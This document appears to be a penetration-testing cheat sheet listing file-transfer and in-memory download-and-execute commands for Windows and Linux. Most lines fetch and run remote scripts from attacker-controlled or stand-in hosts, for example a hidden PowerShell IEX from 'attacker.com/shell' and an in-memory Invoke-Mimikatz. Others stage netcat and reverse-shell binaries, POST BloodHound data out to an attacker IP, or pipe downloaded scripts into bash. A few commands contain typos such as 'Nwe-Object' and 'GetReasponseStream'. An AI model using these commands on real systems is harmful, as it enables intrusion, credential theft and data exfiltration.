## POWERSHELL IN-MEMORY DOWNLOAD AND EXECUTE:  
1) iex(iwr'http://ip/file.ps1')  
2) $down=[System.NET.WebRequest]::Create("http://ip/file.ps1"); $read=$down.GetResponse(); IEX([System.IO.StreamReader]($read.GetReasponseStream())).ReadToEnd()  
3) $file=New-Object -ComObject Msxms2.XMLHTTP;$file.open('GET','http://ip/file.ps1',$false);$file.send();iex $file.responseText  
4) iex(New-Object Net.WebClient).DownloadString('http://ip/reverse.ps1')  
5) $ie=Nwe-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://ip/reverse.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response  
6) powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://attacker.com/shell'))  

## CURL/WGET:  
wget http://10.11.0.106/nc.exe -O nc.exe  
curl http://10.11.0.106/nc.exe -o nc.exe  

## WINDOWS:  
1) powershell (New-Object System.Net.WebClient).DownloadFile("https://[attacker ip]/test.txt", "test.txt")  
2) certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe  
3) Copy from SMB share: copy \\[attacker]\kali\reverse.exe C:\PrivEsc\reverse.exe  
4) Download: (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")  
5) Download: Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1  
6) Download and execute in memory: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')  
7) Pipeline iex: Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex  
8) Bypass IE error: Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex  
10) Disable Internet Explorer’s First Run customization: reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2  

## WINDOWS TO LINUX (BASE64 encoded):  
1) $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))  
2) Invoke-WebRequest -Uri http://[ATTACKER IP]:443 -Method POST -Body $b64  
3) DECODE ON LOCAL MACHINE: echo <base64> | base64 -d -w 0 > bloodhound.zip  

## BITSADMIN:  
1) Download: bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe  
2) Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"  
3) Upload: Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql  

## WINDOWS CMD:  
xcopy \\10.10.10.132\share\nc.exe nc.exe  
copy C:\Temp\nc.exe \\10.10.10.132\c$\Temp\nc.exe  

## RDP SESSION MOUNT DISK:  
1) Create connection: rdesktop 10.10.10.132 -r disk:linux='/home/user/rdesktop/files'  
2) Transfer file: copy \\tsclient\c\temp\mimikatz.exe .  

## OPENSSL BASE64 WINDOWS:  
1) Encryption: openssl.exe enc -base64 -in nc.exe -out nc.txt  
2) Decryption: openssl.exe enc -base64 -d -in nc.txt -out nc.exe  

## LINUX SMB SHARE (IMPACKET):  
smbserver.py -smb2support <share name> <location>  
smbserver.py -smb2support share $(pwd)  

## OPENSSL LINUX:  
1) Create certificate: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem  
2) Stand up server: openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh  
3) Download file: openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh  

## BASH (/DEV/TCP):  
1) Connect to Target's Webserver: exec 3<>/dev/tcp/10.10.10.32/80  
2) HTTP GET Request: echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3  
3) Print the Response: cat <&3  

## PHP:  
1) php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'  
2) php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'  
3) php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'  
4) Pipe output to bash: php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash  

## PYTHON 2:  
import urllib  
urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")  

## PYTHON 3:  
import urllib.request  
urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")  

## RUBY:  
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'  
## PERL:  
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'  

## NETCAT FILE TRANSFER:    
1) Start listener: nc -lvnp 80 <LinEnum.sh  
2) Download file: cat < /dev/tcp/10.10.10.32/80 > LinEnum.sh  

## FTP:  
python -m pyftpdlib -p 21  

## JAVASCRIPT:  
1) Create JS file as wget.js:  
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");  
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);  
WinHttpReq.Send();  
BinStream = new ActiveXObject("ADODB.Stream");  
BinStream.Type = 1;  
BinStream.Open();  
BinStream.Write(WinHttpReq.ResponseBody);  
BinStream.SaveToFile(WScript.Arguments(1));  

2) Download file: cscript /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1  

## VBSCRIPT:  
1) Create file wget.vbs:  
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  
dim bStrm: Set bStrm = createobject("Adodb.Stream")  
xHttp.Open "GET", WScript.Arguments.Item(0), False  
xHttp.Send  

with bStrm  
    .type = 1  
    .open  
    .write xHttp.responseBody  
    .savetofile WScript.Arguments.Item(1), 2  
end with  

2) Download file: cscript /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1  
